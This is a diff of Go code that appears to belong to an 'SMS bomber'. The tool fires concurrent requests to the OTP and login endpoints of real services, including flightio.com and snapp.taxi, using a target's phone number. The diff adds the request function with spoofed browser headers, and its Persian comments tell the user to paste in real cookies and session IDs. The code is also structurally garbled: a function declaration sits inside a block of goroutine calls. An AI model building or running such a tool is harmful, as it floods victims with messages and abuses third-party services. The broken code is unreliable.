@@ -129,7 +129,14 @@ ch := make(chan int)
 			"username": phone,
 		}, ch)
 
-		
+func sms(url string, payload map[string]interface{}, ch chan<- int) {
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		fmt.Println("\033[01;31m[-] Error marshaling JSON for", url, "!", err)
+		ch <- http.StatusInternalServerError
+		return
+	}
+
 	if url == "https://flightio.com/bff/Authentication/CheckUserKey" {
 		req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
 		if err != nil {
@@ -146,10 +153,10 @@ ch := make(chan int)
 			"Client-V":        "10.30.2",
 			"Content-Length":  fmt.Sprintf("%d", len(jsonData)),
 			"Content-Type":    "application/json",
-			"Cookie":          "f-cli-id=...; ...", // کوکی کامل خود را اینجا قرار دهید
+			"Cookie":          "YOUR_COOKIE_HERE", // کوکی واقعی خود را اینجا قرار دهید
 			"Devicetype":      "Windows",
 			"F-Lang":          "fa",
-			"F-Ses-Id":        "9ca8bf75-1231-4afe-81ba-c635cae82480",
+			"F-Ses-Id":        "YOUR_SESSION_ID_HERE", // شناسه جلسه واقعی خود را در صورت نیاز اینجا قرار دهید
 			"Origin":          "https://flightio.com",
 			"Pragma":          "no-cache",
 			"Priority":        "u=1, i",
@@ -183,7 +190,7 @@ ch := make(chan int)
 		}
 		fmt.Println("Flightio Response Body:", string(bodyBytes))
 		ch <- resp.StatusCode
-	} 
+	}
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp", map[string]interface{}{
 			"cellphone": phone,
 		}, ch)
